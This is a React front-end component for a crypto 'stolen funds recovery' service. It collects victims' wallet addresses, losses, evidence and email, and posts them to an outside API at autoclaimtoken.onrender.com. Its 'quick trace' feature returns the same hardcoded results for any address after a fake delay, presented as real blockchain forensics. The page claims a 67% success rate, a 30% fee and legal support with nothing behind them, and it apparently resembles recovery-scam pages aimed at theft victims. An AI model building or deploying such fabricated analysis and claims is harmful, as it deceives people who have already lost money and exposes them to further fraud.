import { useState } from 'react';
import { AlertTriangle, Search, Shield, CheckCircle, Upload, ExternalLink } from 'lucide-react';

export default function StolenFundsRecovery() {
  const [formData, setFormData] = useState({
    victimWallet: '',
    thiefWallet: '',
    stolenAmount: '',
    incidentDate: '',
    evidenceType: '',
    transactionHash: '',
    exchangeInvolved: '',
    description: '',
    contactEmail: '',
    urgencyLevel: 'high'
  });
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [traceResults, setTraceResults] = useState(null);

  const evidenceTypes = [
    'Transaction Hash', 'Screenshots', 'Email Evidence', 'Exchange Records',
    'Wallet Logs', 'Police Report', 'Exchange Communication', 'Other'
  ];

  const exchanges = [
    'Binance', 'Coinbase', 'Kraken', 'KuCoin', 'Huobi', 'OKX', 
    'Gate.io', 'Bybit', 'FTX', 'Uniswap', 'PancakeSwap', 'Other'
  ];

  const handleQuickTrace = async () => {
    if (!formData.thiefWallet) return;
    
    setLoading(true);
    try {
      // Simulate blockchain analysis
      setTimeout(() => {
        setTraceResults({
          address: formData.thiefWallet,
          balance: '12.45 ETH',
          transactions: 247,
          exchanges: ['Binance', 'KuCoin'],
          mixers: ['Tornado Cash'],
          riskScore: 'High',
          lastActivity: '2 hours ago'
        });
        setLoading(false);
      }, 3000);
    } catch (error) {
      setLoading(false);
    }
  };

  const handleSubmit = async () => {
    setLoading(true);
    try {
      const response = await fetch('https://autoclaimtoken.onrender.com/api/recover-stolen-funds', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
      });
      const data = await response.json();
      setResult(data);
    } catch (error) {
      setResult({ success: false, error: 'Recovery request failed' });
    }
    setLoading(false);
  };

  const isFormValid = formData.victimWallet && formData.thiefWallet && 
                     formData.stolenAmount && formData.contactEmail;

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-6xl mx-auto px-4">
        {/* Header */}
        <div className="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden mb-8">
          <div className="bg-gradient-to-r from-orange-600 to-red-600 p-8 text-white">
            <div className="flex items-center space-x-4">
              <div className="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center">
                <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/security.svg" alt="Security" className="w-8 h-8 invert" />
              </div>
              <div>
                <h1 className="text-3xl font-black">Stolen Funds Recovery</h1>
                <p className="text-orange-100 text-lg font-medium">Professional blockchain forensics and fund recovery</p>
              </div>
            </div>
          </div>

          <div className="p-8">
            <div className="grid md:grid-cols-4 gap-6 mb-8">
              <div className="bg-orange-50 border border-orange-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-orange-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/target.svg" alt="Success" className="w-6 h-6 invert" />
                </div>
                <div className="text-2xl font-black text-orange-600 mb-2">67%</div>
                <div className="text-orange-700 font-medium">Success Rate</div>
              </div>
              
              <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-blue-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/clock.svg" alt="Time" className="w-6 h-6 invert" />
                </div>
                <div className="text-2xl font-black text-blue-600 mb-2">48-96h</div>
                <div className="text-blue-700 font-medium">Investigation Time</div>
              </div>
              
              <div className="bg-green-50 border border-green-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-green-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/dollar.svg" alt="Fee" className="w-6 h-6 invert" />
                </div>
                <div className="text-2xl font-black text-green-600 mb-2">30%</div>
                <div className="text-green-700 font-medium">Success Fee</div>
              </div>

              <div className="bg-purple-50 border border-purple-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-purple-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/shield.svg" alt="Legal" className="w-6 h-6 invert" />
                </div>
                <div className="text-2xl font-black text-purple-600 mb-2">24/7</div>
                <div className="text-purple-700 font-medium">Legal Support</div>
              </div>
            </div>

            <div className="bg-red-50 border border-red-200 rounded-xl p-6">
              <div className="flex items-start space-x-4">
                <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/information.svg" alt="Info" className="w-6 h-6 text-red-600 mt-1" />
                <div>
                  <h3 className="font-bold text-red-800 mb-2">Advanced Blockchain Forensics</h3>
                  <ul className="text-red-700 space-y-1 text-sm">
                    <li>• Real-time transaction tracing across 50+ blockchains</li>
                    <li>• Exchange monitoring and freeze requests</li>
                    <li>• Mixer and tumbler analysis</li>
                    <li>• Legal coordination with law enforcement</li>
                    <li>• No upfront payment - you only pay if we recover your funds</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="grid lg:grid-cols-3 gap-8">
          {/* Main Form */}
          <div className="lg:col-span-2">
            <div className="bg-white rounded-2xl shadow-xl border border-gray-200 p-8">
              <h2 className="text-2xl font-black text-gray-900 mb-6">Recovery Request Form</h2>
              
              <div className="space-y-6">
                {/* Wallet Addresses */}
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Your Wallet Address *
                    </label>
                    <input
                      value={formData.victimWallet}
                      onChange={(e) => setFormData({...formData, victimWallet: e.target.value})}
                      placeholder="0x..."
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 font-mono"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Thief's Wallet Address *
                    </label>
                    <div className="flex space-x-2">
                      <input
                        value={formData.thiefWallet}
                        onChange={(e) => setFormData({...formData, thiefWallet: e.target.value})}
                        placeholder="0x..."
                        className="flex-1 p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 font-mono"
                      />
                      <button
                        onClick={handleQuickTrace}
                        disabled={!formData.thiefWallet || loading}
                        className="px-4 py-3 bg-blue-600 text-white rounded-xl hover:bg-blue-700 disabled:opacity-50"
                      >
                        <Search className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                </div>

                {/* Incident Details */}
                <div className="grid md:grid-cols-3 gap-6">
                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Stolen Amount (USD) *
                    </label>
                    <input
                      type="number"
                      value={formData.stolenAmount}
                      onChange={(e) => setFormData({...formData, stolenAmount: e.target.value})}
                      placeholder="10000"
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Incident Date
                    </label>
                    <input
                      type="date"
                      value={formData.incidentDate}
                      onChange={(e) => setFormData({...formData, incidentDate: e.target.value})}
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Urgency Level
                    </label>
                    <select
                      value={formData.urgencyLevel}
                      onChange={(e) => setFormData({...formData, urgencyLevel: e.target.value})}
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                    >
                      <option value="critical">Critical (Active theft)</option>
                      <option value="high">High (Recent theft)</option>
                      <option value="medium">Medium (Investigating)</option>
                    </select>
                  </div>
                </div>

                {/* Evidence */}
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Evidence Type
                    </label>
                    <select
                      value={formData.evidenceType}
                      onChange={(e) => setFormData({...formData, evidenceType: e.target.value})}
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                    >
                      <option value="">Select evidence type</option>
                      {evidenceTypes.map(type => (
                        <option key={type} value={type}>{type}</option>
                      ))}
                    </select>
                  </div>

                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Transaction Hash
                    </label>
                    <input
                      value={formData.transactionHash}
                      onChange={(e) => setFormData({...formData, transactionHash: e.target.value})}
                      placeholder="0x..."
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 font-mono"
                    />
                  </div>
                </div>

                {/* Exchange Information */}
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Exchange Involved
                    </label>
                    <select
                      value={formData.exchangeInvolved}
                      onChange={(e) => setFormData({...formData, exchangeInvolved: e.target.value})}
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                    >
                      <option value="">Select exchange (if any)</option>
                      {exchanges.map(exchange => (
                        <option key={exchange} value={exchange}>{exchange}</option>
                      ))}
                    </select>
                  </div>

                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Contact Email *
                    </label>
                    <input
                      type="email"
                      value={formData.contactEmail}
                      onChange={(e) => setFormData({...formData, contactEmail: e.target.value})}
                      placeholder="your@email.com"
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                    />
                  </div>
                </div>

                {/* Description */}
                <div>
                  <label className="block text-sm font-bold text-gray-700 mb-2">
                    Incident Description
                  </label>
                  <textarea
                    value={formData.description}
                    onChange={(e) => setFormData({...formData, description: e.target.value})}
                    placeholder="Describe how the theft occurred, any suspicious activity, etc."
                    className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                    rows="4"
                  />
                </div>

                {/* Submit Button */}
                <div className="pt-6">
                  <button
                    onClick={handleSubmit}
                    disabled={loading || !isFormValid}
                    className="w-full bg-gradient-to-r from-orange-600 to-red-600 text-white font-bold py-4 px-8 rounded-xl hover:from-orange-700 hover:to-red-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-3"
                  >
                    {loading ? (
                      <>
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>Opening Investigation...</span>
                      </>
                    ) : (
                      <>
                        <AlertTriangle className="w-5 h-5" />
                        <span>Start Stolen Funds Recovery</span>
                      </>
                    )}
                  </button>
                  
                  {!isFormValid && (
                    <p className="text-sm text-red-600 mt-2 text-center">
                      Please fill in all required fields (marked with *)
                    </p>
                  )}
                </div>
              </div>
            </div>
          </div>

          {/* Trace Results Sidebar */}
          <div className="lg:col-span-1">
            <div className="bg-white rounded-2xl shadow-xl border border-gray-200 p-6 sticky top-8">
              <h3 className="text-xl font-bold text-gray-900 mb-4">Quick Trace Results</h3>
              
              {!traceResults && !loading && (
                <div className="text-center py-8">
                  <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/search.svg" alt="Search" className="w-12 h-12 mx-auto mb-4 opacity-50" />
                  <p className="text-gray-500">Enter thief's wallet address and click trace to see preliminary analysis</p>
                </div>
              )}

              {loading && (
                <div className="text-center py-8">
                  <div className="w-8 h-8 border-2 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                  <p className="text-gray-600">Analyzing blockchain data...</p>
                </div>
              )}

              {traceResults && (
                <div className="space-y-4">
                  <div className="bg-gray-50 p-4 rounded-xl">
                    <div className="text-sm text-gray-600 mb-1">Address</div>
                    <div className="font-mono text-sm break-all">{traceResults.address}</div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="bg-blue-50 p-3 rounded-lg">
                      <div className="text-xs text-blue-600">Balance</div>
                      <div className="font-bold text-blue-800">{traceResults.balance}</div>
                    </div>
                    <div className="bg-green-50 p-3 rounded-lg">
                      <div className="text-xs text-green-600">Transactions</div>
                      <div className="font-bold text-green-800">{traceResults.transactions}</div>
                    </div>
                  </div>

                  <div className="bg-red-50 p-4 rounded-xl">
                    <div className="text-sm font-bold text-red-800 mb-2">Risk Assessment</div>
                    <div className="text-red-700 text-sm">
                      Risk Score: <span className="font-bold">{traceResults.riskScore}</span>
                    </div>
                    <div className="text-red-700 text-sm">
                      Last Activity: {traceResults.lastActivity}
                    </div>
                  </div>

                  <div>
                    <div className="text-sm font-bold text-gray-700 mb-2">Connected Services</div>
                    <div className="space-y-2">
                      {traceResults.exchanges.map((exchange, i) => (
                        <div key={i} className="flex items-center space-x-2 text-sm">
                          <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                          <span>Exchange: {exchange}</span>
                        </div>
                      ))}
                      {traceResults.mixers.map((mixer, i) => (
                        <div key={i} className="flex items-center space-x-2 text-sm">
                          <div className="w-2 h-2 bg-red-500 rounded-full"></div>
                          <span>Mixer: {mixer}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Result */}
        {result && (
          <div className={`mt-8 p-6 rounded-xl border ${
            result.success 
              ? 'bg-green-50 border-green-200' 
              : 'bg-red-50 border-red-200'
          }`}>
            <div className="flex items-start space-x-4">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center ${
                result.success ? 'bg-green-500' : 'bg-red-500'
              }`}>
                {result.success ? (
                  <CheckCircle className="w-5 h-5 text-white" />
                ) : (
                  <AlertTriangle className="w-5 h-5 text-white" />
                )}
              </div>
              <div className="flex-1">
                <h4 className={`font-bold mb-2 ${
                  result.success ? 'text-green-800' : 'text-red-800'
                }`}>
                  {result.success ? 'Investigation Opened Successfully' : 'Request Failed'}
                </h4>
                <p className={`text-sm mb-4 ${
                  result.success ? 'text-green-700' : 'text-red-700'
                }`}>
                  {result.message || result.error}
                </p>
                
                {result.success && (
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    {result.caseId && (
                      <div className="bg-white p-3 rounded-lg border">
                        <div className="text-xs text-gray-600">Case ID</div>
                        <div className="font-bold">{result.caseId}</div>
                      </div>
                    )}
                    <div className="bg-white p-3 rounded-lg border">
                      <div className="text-xs text-gray-600">Timeline</div>
                      <div className="font-bold">{result.estimatedTime}</div>
                    </div>
                    <div className="bg-white p-3 rounded-lg border">
                      <div className="text-xs text-gray-600">Success Rate</div>
                      <div className="font-bold">{result.successRate}</div>
                    </div>
                    <div className="bg-white p-3 rounded-lg border">
                      <div className="text-xs text-gray-600">Fee</div>
                      <div className="font-bold">{result.fee}</div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}